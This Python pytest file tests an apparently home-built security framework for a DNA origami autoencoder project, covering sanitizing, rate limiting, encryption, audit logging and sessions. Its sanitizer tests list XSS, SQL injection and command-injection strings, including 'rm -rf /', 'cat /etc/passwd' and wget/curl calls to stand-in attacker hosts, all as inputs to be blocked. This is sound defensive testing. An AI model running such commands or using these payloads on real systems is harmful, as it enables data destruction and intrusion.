"""Security validation tests for DNA Origami AutoEncoder."""

import pytest
import time
import threading
from unittest.mock import patch, Mock
import tempfile
import os

from dna_origami_ae.security.advanced_security import (
    AdvancedSecurityFramework, InputSanitizer, RateLimiter, 
    EncryptionManager, SecurityAuditor, ThreatLevel, secure_endpoint
)


class TestInputSanitizer:
    """Test input sanitization security features."""
    
    def setup_method(self):
        """Setup test environment."""
        self.sanitizer = InputSanitizer()
    
    def test_malicious_script_injection_blocked(self):
        """Test that script injection attempts are blocked."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "vbscript:msgbox(1)",
            "<img onerror='alert(1)' src='x'>",
            "eval('malicious code')",
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError, match="Invalid input detected"):
                self.sanitizer.sanitize_string(malicious_input, context="test")
    
    def test_sql_injection_blocked(self):
        """Test that SQL injection attempts are blocked."""
        sql_attacks = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM sensitive_data",
            "'; INSERT INTO users VALUES ('hacker'); --",
        ]
        
        for attack in sql_attacks:
            with pytest.raises(ValueError, match="Invalid input: potential SQL injection"):
                self.sanitizer.sanitize_string(attack, context="test")
    
    def test_command_injection_blocked(self):
        """Test that command injection attempts are blocked."""
        command_attacks = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/backdoor",
            "`curl attacker.com`",
            "$(echo malicious)",
            "../../../etc/passwd",
        ]
        
        for attack in command_attacks:
            with pytest.raises(ValueError, match="Invalid input: potential command injection"):
                self.sanitizer.sanitize_string(attack, context="test")
    
    def test_legitimate_input_allowed(self):
        """Test that legitimate input is properly sanitized but allowed."""
        legitimate_inputs = [
            "Hello, World!",
            "DNA sequence: ATGCATGC",
            "Image processing for research",
            "File name: dna_sample_001.png",
        ]
        
        for input_str in legitimate_inputs:
            result = self.sanitizer.sanitize_string(input_str, context="test")
            assert result is not None
            assert len(result) > 0
    
    def test_html_encoding_applied(self):
        """Test that HTML encoding is properly applied."""
        test_input = "Test <tag> & \"quoted\" text"
        result = self.sanitizer.sanitize_string(test_input, allow_html=False)
        
        assert "&lt;" in result
        assert "&gt;" in result
        assert "&amp;" in result
        assert "&quot;" in result
    
    def test_dna_sequence_validation(self):
        """Test DNA sequence validation."""
        # Valid DNA sequences
        valid_sequences = [
            "ATGC",
            "ATGCATGCATGC",
            "atgcatgc",  # Should work with lowercase
        ]
        
        for seq in valid_sequences:
            assert self.sanitizer.validate_dna_sequence(seq)
        
        # Invalid DNA sequences
        invalid_sequences = [
            "ATGX",  # Invalid base
            "ATG123",  # Numbers
            "ATG-CGT",  # Special characters
            "A" * 100001,  # Too long
            123,  # Not a string
        ]
        
        for seq in invalid_sequences:
            assert not self.sanitizer.validate_dna_sequence(seq)
    
    def test_image_data_validation(self):
        """Test image data validation."""
        import numpy as np
        
        # Valid image data
        valid_image = np.random.randint(0, 256, (64, 64), dtype=np.uint8)
        assert self.sanitizer.validate_image_data(valid_image)
        
        # Invalid image data
        invalid_images = [
            np.random.random((10000, 10000)),  # Too large
            np.random.random((64, 64, 64, 64)),  # Too many dimensions
            "not an array",  # Not numpy array
            np.random.random((64, 64)).astype(np.complex128),  # Invalid dtype
        ]
        
        for img in invalid_images:
            assert not self.sanitizer.validate_image_data(img)
    
    def test_input_length_limits(self):
        """Test input length limitations."""
        # Test normal length
        normal_input = "A" * 100
        result = self.sanitizer.sanitize_string(normal_input, max_length=200)
        assert len(result) == 100
        
        # Test truncation
        long_input = "A" * 1500
        result = self.sanitizer.sanitize_string(long_input, max_length=1000)
        assert len(result) == 1000


class TestRateLimiter:
    """Test rate limiting security features."""
    
    def setup_method(self):
        """Setup test environment."""
        self.rate_limiter = RateLimiter()
        # Use smaller limits for testing
        self.rate_limiter.limits = {
            'requests_per_minute': 5,
            'requests_per_hour': 20,
            'login_attempts_per_hour': 3,
            'failed_attempts_threshold': 2
        }
    
    def test_normal_request_rate_allowed(self):
        """Test that normal request rates are allowed."""
        ip = "192.168.1.1"
        
        # Should allow normal rate
        for i in range(3):
            assert self.rate_limiter.check_rate_limit(ip)
            self.rate_limiter.record_attempt(ip, success=True)
            time.sleep(0.01)
    
    def test_rate_limit_exceeded_blocked(self):
        """Test that excessive requests are blocked."""
        ip = "192.168.1.2"
        
        # Fill up the rate limit
        for i in range(5):
            assert self.rate_limiter.check_rate_limit(ip)
            self.rate_limiter.record_attempt(ip, success=True)
        
        # Next request should be blocked
        assert not self.rate_limiter.check_rate_limit(ip)
    
    def test_failed_attempts_trigger_block(self):
        """Test that repeated failed attempts trigger blocking."""
        ip = "192.168.1.3"
        user = "test_user"
        
        # Record failed attempts
        for i in range(3):
            self.rate_limiter.check_rate_limit(ip, user)
            self.rate_limiter.record_attempt(ip, user, success=False)
        
        # Should be blocked after threshold
        assert not self.rate_limiter.check_rate_limit(ip, user)
    
    def test_user_specific_rate_limiting(self):
        """Test user-specific rate limiting."""
        ip = "192.168.1.4"
        user1 = "user1"
        user2 = "user2"
        
        # User1 exceeds limit
        for i in range(5):
            assert self.rate_limiter.check_rate_limit(ip, user1)
            self.rate_limiter.record_attempt(ip, user1, success=True)
        
        # User1 should be blocked
        assert not self.rate_limiter.check_rate_limit(ip, user1)
        
        # User2 should still work
        assert self.rate_limiter.check_rate_limit(ip, user2)
    
    def test_rate_limit_status_reporting(self):
        """Test rate limiter status reporting."""
        ip = "192.168.1.5"
        
        # Generate some activity
        for i in range(3):
            self.rate_limiter.check_rate_limit(ip)
            self.rate_limiter.record_attempt(ip, success=True)
        
        status = self.rate_limiter.get_status()
        
        assert 'active_blocks' in status
        assert 'tracked_ips' in status
        assert 'limits' in status
        assert status['tracked_ips'] > 0


class TestEncryptionManager:
    """Test encryption and key management security."""
    
    def setup_method(self):
        """Setup test environment."""
        self.encryption_manager = EncryptionManager()
    
    def test_symmetric_encryption_decryption(self):
        """Test symmetric encryption and decryption."""
        test_data = "Sensitive DNA sequence data: ATGCATGC"
        
        # Encrypt data
        encrypted = self.encryption_manager.encrypt_data(test_data)
        assert encrypted != test_data.encode()
        assert len(encrypted) > len(test_data)
        
        # Decrypt data
        decrypted = self.encryption_manager.decrypt_data(encrypted)
        assert decrypted.decode() == test_data
    
    def test_asymmetric_encryption_decryption(self):
        """Test asymmetric encryption and decryption."""
        test_data = "Short message"
        
        # Encrypt with public key
        encrypted = self.encryption_manager.encrypt_data(test_data, use_asymmetric=True)
        assert encrypted != test_data.encode()
        
        # Decrypt with private key
        decrypted = self.encryption_manager.decrypt_data(encrypted, use_asymmetric=True)
        assert decrypted.decode() == test_data
    
    def test_asymmetric_size_limit(self):
        """Test asymmetric encryption size limits."""
        # RSA 2048 has ~245 byte limit for OAEP padding
        large_data = "A" * 300
        
        with pytest.raises(ValueError, match="Data too large for RSA encryption"):
            self.encryption_manager.encrypt_data(large_data, use_asymmetric=True)
    
    def test_key_rotation(self):
        """Test encryption key rotation."""
        test_data = "Test data for key rotation"
        
        # Encrypt with initial key
        encrypted1 = self.encryption_manager.encrypt_data(test_data)
        
        # Rotate keys
        old_key_count = len(self.encryption_manager.old_keys)
        self.encryption_manager.rotate_keys()
        new_key_count = len(self.encryption_manager.old_keys)
        
        assert new_key_count == old_key_count + 1
        
        # Should still decrypt old data
        decrypted1 = self.encryption_manager.decrypt_data(encrypted1)
        assert decrypted1.decode() == test_data
        
        # New encryption should work with new key
        encrypted2 = self.encryption_manager.encrypt_data(test_data)
        decrypted2 = self.encryption_manager.decrypt_data(encrypted2)
        assert decrypted2.decode() == test_data
    
    def test_secure_hashing(self):
        """Test secure password hashing."""
        password = "secure_password_123"
        
        # Create hash
        hash_value, salt = self.encryption_manager.create_secure_hash(password)
        
        assert len(hash_value) == 32  # SHA256 output
        assert len(salt) == 32  # Salt length
        assert hash_value != password.encode()
        
        # Verify hash
        assert self.encryption_manager.verify_hash(password, hash_value, salt)
        assert not self.encryption_manager.verify_hash("wrong_password", hash_value, salt)
    
    def test_automatic_key_rotation_check(self):
        """Test automatic key rotation checking."""
        # Mock old rotation time
        self.encryption_manager.last_key_rotation = time.time() - 86500  # Just over 24 hours
        
        initial_key = self.encryption_manager.master_key
        self.encryption_manager.check_key_rotation()
        
        # Key should have been rotated
        assert self.encryption_manager.master_key != initial_key
        assert abs(self.encryption_manager.last_key_rotation - time.time()) < 1


class TestSecurityAuditor:
    """Test security auditing and monitoring."""
    
    def setup_method(self):
        """Setup test environment."""
        self.auditor = SecurityAuditor()
    
    def test_security_event_logging(self):
        """Test security event logging."""
        self.auditor.log_security_event(
            "test_event",
            "Test security event",
            ThreatLevel.LOW,
            source_ip="192.168.1.1",
            user_id="test_user"
        )
        
        assert len(self.auditor.events) == 1
        event = self.auditor.events[0]
        
        assert event.event_type == "test_event"
        assert event.description == "Test security event"
        assert event.threat_level == ThreatLevel.LOW
        assert event.source_ip == "192.168.1.1"
        assert event.user_id == "test_user"
    
    def test_threat_pattern_detection(self):
        """Test threat pattern detection."""
        ip = "192.168.1.100"
        
        # Simulate brute force attack pattern
        for i in range(6):  # Exceed threshold of 5
            self.auditor.log_security_event(
                "multiple_failed_logins",
                f"Failed login attempt {i+1}",
                ThreatLevel.MEDIUM,
                source_ip=ip
            )
        
        # Should have detected threat pattern
        # (In practice, this would trigger alerts)
        events_from_ip = [e for e in self.auditor.events if e.source_ip == ip]
        assert len(events_from_ip) == 6
    
    def test_security_summary_generation(self):
        """Test security summary generation."""
        # Generate some security events
        for i in range(10):
            self.auditor.log_security_event(
                f"event_type_{i % 3}",
                f"Test event {i}",
                [ThreatLevel.LOW, ThreatLevel.MEDIUM, ThreatLevel.HIGH][i % 3],
                source_ip=f"192.168.1.{i + 1}"
            )
        
        summary = self.auditor.get_security_summary(hours=24)
        
        assert summary['total_events'] == 10
        assert len(summary['event_types']) == 3
        assert len(summary['threat_levels']) == 3
        assert summary['high_threat_events'] > 0
    
    def test_security_log_export(self):
        """Test security log export functionality."""
        # Add some events
        self.auditor.log_security_event(
            "export_test",
            "Test event for export",
            ThreatLevel.MEDIUM,
            source_ip="192.168.1.200"
        )
        
        # Export to JSON
        json_export = self.auditor.export_security_log(format_type='json')
        
        assert '"event_type": "export_test"' in json_export
        assert '"threat_level": "medium"' in json_export
        assert '"source_ip": "192.168.1.200"' in json_export
    
    def test_alert_callback_system(self):
        """Test security alert callback system."""
        callback_triggered = threading.Event()
        alert_data = {}
        
        def test_callback(pattern_name, data):
            nonlocal alert_data
            alert_data = data
            callback_triggered.set()
        
        self.auditor.add_alert_callback(test_callback)
        
        # Trigger threat pattern
        ip = "192.168.1.201"
        for i in range(6):  # Exceed brute force threshold
            self.auditor.log_security_event(
                "multiple_failed_logins",
                "Brute force attempt",
                ThreatLevel.HIGH,
                source_ip=ip
            )
        
        # Wait for callback (if implemented)
        # Note: This might not trigger if threat detection is not fully implemented
        if callback_triggered.wait(timeout=1):
            assert 'pattern_name' in alert_data
            assert 'threat_level' in alert_data


class TestAdvancedSecurityFramework:
    """Test integrated security framework."""
    
    def setup_method(self):
        """Setup test environment."""
        self.framework = AdvancedSecurityFramework()
    
    def test_comprehensive_input_validation(self):
        """Test comprehensive input validation."""
        # Test with nested data structure
        test_data = {
            "user_input": "Normal text",
            "dna_sequence": "ATGC",
            "nested": {
                "value": "Safe value",
                "list": ["item1", "item2"]
            }
        }
        
        sanitized = self.framework.validate_and_sanitize_input(test_data, "test_context")
        
        assert isinstance(sanitized, dict)
        assert sanitized["user_input"] == "Normal text"
        assert "nested" in sanitized
        assert isinstance(sanitized["nested"]["list"], list)
    
    def test_malicious_input_blocked_by_framework(self):
        """Test that malicious input is blocked by the framework."""
        malicious_data = {
            "script": "<script>alert('xss')</script>",
            "sql": "'; DROP TABLE users; --"
        }
        
        with pytest.raises(ValueError):
            self.framework.validate_and_sanitize_input(malicious_data)
    
    def test_access_permission_checking(self):
        """Test access permission checking with rate limiting."""
        ip = "192.168.1.300"
        
        # Normal access should work
        assert self.framework.check_access_permission(ip)
        
        # Excessive access should be blocked
        for i in range(10):  # Exceed rate limit
            self.framework.check_access_permission(ip)
        
        # Should be blocked now
        assert not self.framework.check_access_permission(ip)
    
    def test_secure_session_management(self):
        """Test secure session creation and validation."""
        user_id = "test_user_123"
        ip = "192.168.1.400"
        
        # Create session
        session_id = self.framework.create_secure_session(user_id, ip)
        assert session_id is not None
        assert len(session_id) > 20  # Should be sufficiently long
        
        # Validate session
        session_data = self.framework.validate_session(session_id, ip)
        assert session_data is not None
        assert session_data['user_id'] == user_id
        assert session_data['ip_address'] == ip
        
        # Session from different IP should fail
        assert self.framework.validate_session(session_id, "192.168.1.999") is None
        
        # Invalidate session
        self.framework.invalidate_session(session_id)
        assert self.framework.validate_session(session_id, ip) is None
    
    def test_session_timeout(self):
        """Test session timeout functionality."""
        user_id = "test_user_timeout"
        ip = "192.168.1.500"
        
        # Create session with short timeout
        self.framework.security_policies['session_timeout'] = 1  # 1 second timeout
        session_id = self.framework.create_secure_session(user_id, ip)
        
        # Should work immediately
        assert self.framework.validate_session(session_id, ip) is not None
        
        # Wait for timeout
        time.sleep(2)
        
        # Should be expired
        assert self.framework.validate_session(session_id, ip) is None
    
    def test_data_encryption_integration(self):
        """Test data encryption integration."""
        sensitive_data = "Highly sensitive DNA research data"
        
        # Encrypt data
        encrypted = self.framework.encrypt_sensitive_data(sensitive_data)
        assert encrypted != sensitive_data.encode()
        
        # Decrypt data
        decrypted = self.framework.decrypt_sensitive_data(encrypted)
        assert decrypted.decode() == sensitive_data
    
    def test_security_status_reporting(self):
        """Test comprehensive security status reporting."""
        # Generate some activity
        self.framework.check_access_permission("192.168.1.600")
        self.framework.create_secure_session("test_user", "192.168.1.600")
        
        status = self.framework.get_security_status()
        
        assert 'security_policies' in status
        assert 'active_sessions' in status
        assert 'rate_limiter_status' in status
        assert 'security_summary' in status
        assert 'encryption_key_age' in status
    
    def test_security_policy_enforcement(self):
        """Test security policy enforcement."""
        # Test with different security policies
        original_policy = self.framework.security_policies['require_authentication']
        
        # Disable authentication requirement
        self.framework.security_policies['require_authentication'] = False
        
        # Should reflect in behavior
        status = self.framework.get_security_status()
        assert not status['security_policies']['require_authentication']
        
        # Restore policy
        self.framework.security_policies['require_authentication'] = original_policy


class TestSecureEndpointDecorator:
    """Test secure endpoint decorator functionality."""
    
    def test_secure_endpoint_basic_functionality(self):
        """Test basic secure endpoint functionality."""
        @secure_endpoint(require_auth=False)
        def test_endpoint(data, ip_address="127.0.0.1"):
            return f"Processed: {data}"
        
        result = test_endpoint("test data", ip_address="127.0.0.1")
        assert result == "Processed: test data"
    
    def test_secure_endpoint_input_sanitization(self):
        """Test input sanitization in secure endpoint."""
        @secure_endpoint(require_auth=False)
        def test_endpoint(user_input, ip_address="127.0.0.1"):
            return f"Safe: {user_input}"
        
        # Should sanitize HTML
        result = test_endpoint("<script>alert('xss')</script>", ip_address="127.0.0.1")
        # The malicious script should be blocked
        assert "script" not in result or "&lt;script&gt;" in result
    
    def test_secure_endpoint_rate_limiting(self):
        """Test rate limiting in secure endpoint."""
        @secure_endpoint(require_auth=False, rate_limit=True)
        def test_endpoint(data, ip_address="127.0.0.1"):
            return "OK"
        
        ip = "192.168.1.700"
        
        # Should work initially
        result = test_endpoint("data", ip_address=ip)
        assert result == "OK"
        
        # After many requests, should raise rate limit error
        for i in range(100):
            try:
                test_endpoint("data", ip_address=ip)
            except PermissionError as e:
                if "Rate limit exceeded" in str(e):
                    break
        else:
            pytest.fail("Rate limit should have been triggered")
    
    def test_secure_endpoint_session_validation(self):
        """Test session validation in secure endpoint."""
        from dna_origami_ae.security.advanced_security import security_framework
        
        @secure_endpoint(require_auth=True)
        def test_endpoint(data, session_id=None, ip_address="127.0.0.1"):
            return "Authenticated OK"
        
        ip = "127.0.0.1"
        
        # Create valid session
        session_id = security_framework.create_secure_session("test_user", ip)
        
        # Should work with valid session
        result = test_endpoint("data", session_id=session_id, ip_address=ip)
        assert result == "Authenticated OK"
        
        # Should fail with invalid session
        with pytest.raises(PermissionError, match="Invalid or expired session"):
            test_endpoint("data", session_id="invalid_session", ip_address=ip)


@pytest.mark.security
class TestSecurityIntegration:
    """Integration tests for security components."""
    
    def test_end_to_end_security_workflow(self):
        """Test complete security workflow."""
        framework = AdvancedSecurityFramework()
        
        # 1. Input validation
        user_input = {"message": "Hello, World!", "data": "ATGCATGC"}
        sanitized = framework.validate_and_sanitize_input(user_input)
        assert sanitized["message"] == "Hello, World!"
        
        # 2. Access control
        ip = "192.168.1.800"
        assert framework.check_access_permission(ip)
        
        # 3. Session management
        session_id = framework.create_secure_session("integration_user", ip)
        session = framework.validate_session(session_id, ip)
        assert session is not None
        
        # 4. Data encryption
        sensitive_data = "Confidential research results"
        encrypted = framework.encrypt_sensitive_data(sensitive_data)
        decrypted = framework.decrypt_sensitive_data(encrypted)
        assert decrypted.decode() == sensitive_data
        
        # 5. Security monitoring
        status = framework.get_security_status()
        assert status['active_sessions'] > 0
    
    def test_security_under_load(self):
        """Test security features under concurrent load."""
        framework = AdvancedSecurityFramework()
        errors = []
        
        def security_operations(thread_id):
            try:
                ip = f"192.168.2.{thread_id}"
                
                # Perform various security operations
                framework.check_access_permission(ip)
                session_id = framework.create_secure_session(f"user_{thread_id}", ip)
                framework.validate_session(session_id, ip)
                
                data = f"test data {thread_id}"
                encrypted = framework.encrypt_sensitive_data(data)
                decrypted = framework.decrypt_sensitive_data(encrypted)
                assert decrypted.decode() == data
                
            except Exception as e:
                errors.append(e)
        
        # Run concurrent operations
        threads = []
        for i in range(10):
            thread = threading.Thread(target=security_operations, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should handle concurrent operations without errors
        assert len(errors) == 0, f"Security operations failed under load: {errors}"
    
    def test_security_configuration_validation(self):
        """Test security configuration validation."""
        framework = AdvancedSecurityFramework()
        
        # Test that all required security policies are present
        required_policies = [
            'require_authentication',
            'require_encryption', 
            'enable_rate_limiting',
            'enable_input_validation',
            'enable_audit_logging'
        ]
        
        for policy in required_policies:
            assert policy in framework.security_policies
        
        # Test that encryption keys are properly initialized
        assert framework.encryption_manager.master_key is not None
        assert framework.encryption_manager.private_key is not None
        assert framework.encryption_manager.public_key is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])